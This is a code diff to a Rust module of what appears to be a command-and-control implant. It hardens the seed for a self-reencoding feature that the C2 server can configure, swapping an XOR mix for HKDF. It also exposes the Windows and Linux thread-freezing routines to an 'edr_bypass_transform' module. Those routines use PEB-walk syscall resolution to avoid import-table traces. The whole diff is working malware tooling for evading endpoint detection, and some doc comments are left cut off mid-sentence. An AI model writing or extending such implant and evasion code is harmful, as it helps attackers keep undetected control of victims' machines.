@@ -24,6 +24,8 @@
 #![cfg(feature = "self-reencode")]
 
 use anyhow::{Context, Result};
+use chacha20poly1305::aead::OsRng;
+use hkdf::Hkdf;
 use rand::RngCore;
 use sha2::{Digest, Sha256};
 use std::sync::atomic::{AtomicU64, Ordering};
@@ -47,6 +49,16 @@ pub const DEFAULT_REENCODE_INTERVAL_SECS: u64 = 4 * 3600;
 /// ensuring the re-encode feature is active from the first cycle even before the
 /// C2 server sends `SetReencodeSeed`.  Mixing in `OsRng` ensures that two agents
 /// sharing the same session key will still produce different seeds.
+///
+/// # Security note (P2-07)
+///
+/// The returned seed is **not a cryptographic key** and must **never** be used
+/// as one.  It is derived by truncating a SHA-256 digest to 8 bytes (64 bits),
+/// which is insufficient for cryptographic key material.  The seed is used solely
+/// as an obfuscation parameter for the self-reencoding transform — a
+/// non-cryptographic defence-in-depth layer.  If future use requires more than
+/// 64 bits of entropy, consume the full 32-byte SHA-256 output rather than the
+/// truncated 8-byte form.
 ///
 /// Returns the derived seed and a static string indicating the source
 /// ("auto-derived" for this path vs "c2-supplied" for `set_seed`).
@@ -90,19 +102,26 @@ pub fn set_interval_secs(secs: u64) {
     }
 }
 
-/// Derive a fresh seed from cryptographically secure random bytes mixed with
-/// the C2-provided nonce.
+/// Derive a fresh seed from cryptographically secure random bytes using
+/// HKDF-SHA256 with the C2-provided nonce as salt.
 ///
-/// This ensures each re-encoding pass produces a unique transformation even
-/// if the server nonce is static.  The seed is derived from `rand()` bytes
-/// XORed with the server nonce for domain separation.
+/// P1-23: Previous implementation XORed `thread_rng()` output with the
+/// server nonce, which is not a proper KDF.  This version uses HKDF-SHA256
+/// with `OsRng` for the input keying material, the server nonce as salt,
+/// and a domain-separated info string, producing a cryptographically
+/// uniform 8-byte seed.
 pub fn derive_fresh_seed(server_nonce: u64) -> u64 {
     use rand::RngCore;
-    let mut seed = [0u8; 8];
-    rand::thread_rng().fill_bytes(&mut seed);
-    let seed_u64 = u64::from_le_bytes(seed);
-    // Mix in server_nonce for domain separation
-    let seed = seed_u64 ^ server_nonce;
+    let mut rand_bytes = [0u8; 32];
+    OsRng.fill_bytes(&mut rand_bytes);
+
+    let salt = server_nonce.to_le_bytes();
+    let hkdf = Hkdf::<Sha256>::new(Some(&salt), &rand_bytes);
+    let mut seed_bytes = [0u8; 8];
+    hkdf.expand(b"orchestra-reencode-seed", &mut seed_bytes)
+        .expect("HKDF expand for reencode seed must succeed");
+
+    let seed = u64::from_le_bytes(seed_bytes);
     // Ensure the seed is non-zero (zero would produce the same output
     // regardless of input — ChaCha8RNG with zero seed is still valid but
     // using a non-zero value avoids the degenerate "always same" case if
@@ -277,9 +296,11 @@ const FREEZE_WARN_SECS: u64 = 30;
 // ── Windows thread freeze ─────────────────────────────────────────────────
 
 /// Suspended thread state.  On drop, any threads that have not yet been
-/// resumed are thawed automatically (safety net for panics).
+// P1-03: Made pub(crate) so edr_bypass_transform can share the same
+// thread-freeze infrastructure (avoids duplicating ~200 lines of NT
+// thread-enumeration code).
 #[cfg(windows)]
-struct FrozenThreads {
+pub(crate) struct FrozenThreads {
     /// (thread handle, previous suspend count) for each suspended thread.
     handles: Vec<(usize, u32)>,
     /// Instant when `freeze_threads()` finished suspending.
@@ -291,7 +312,7 @@ struct FrozenThreads {
 #[cfg(windows)]
 impl FrozenThreads {
     /// Resume all frozen threads in reverse suspension order, close handles.
-    fn thaw(&mut self) {
+    pub(crate) fn thaw(&mut self) {
         if self.thawed {
             return;
         }
@@ -350,14 +371,11 @@ fn current_pid() -> usize {
     }
 }
 
-/// Suspend all threads in the current process except the calling thread.
-///
-/// Uses `NtQuerySystemInformation(SystemProcessInformation)` to enumerate
 /// threads, `NtOpenThread` + `NtSuspendThread` to freeze them.  All NT
 /// functions are resolved via `crate::syscalls` (PEB-walk SSN resolution) — no
 /// kernel32 IAT entries are added.
 #[cfg(windows)]
-fn freeze_threads() -> Result<FrozenThreads> {
+pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
     use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
 
     // ── NT structures for NtQuerySystemInformation(SystemProcessInformation) ──
@@ -573,10 +591,10 @@ fn freeze_threads() -> Result<FrozenThreads> {
     anyhow::bail!("self_reencode: unexpected end of thread enumeration");
 }
 
-// ── Linux thread freeze ───────────────────────────────────────────────────
-
+// P1-03: Made pub(crate) so edr_bypass_transform can share the same
+// thread-freeze infrastructure.
 #[cfg(target_os = "linux")]
-struct FrozenThreads {
+pub(crate) struct FrozenThreads {
     /// TIDs that were sent SIGSTOP.
     tids: Vec<i32>,
     /// Process ID (needed for tgkill to resume).
@@ -589,7 +607,7 @@ struct FrozenThreads {
 
 #[cfg(target_os = "linux")]
 impl FrozenThreads {
-    fn thaw(&mut self) {
+    pub(crate) fn thaw(&mut self) {
         if self.thawed {
             return;
         }
@@ -628,12 +646,10 @@ impl Drop for FrozenThreads {
     }
 }
 
-/// Suspend all threads in the current process except the calling thread.
-///
 /// Reads `/proc/self/task/` to enumerate TIDs and sends `SIGSTOP` via
 /// `tgkill` to each non-current thread.
 #[cfg(target_os = "linux")]
-fn freeze_threads() -> Result<FrozenThreads> {
+pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
     let pid = unsafe { libc::getpid() };
     let my_tid = unsafe { libc::gettid() };
 
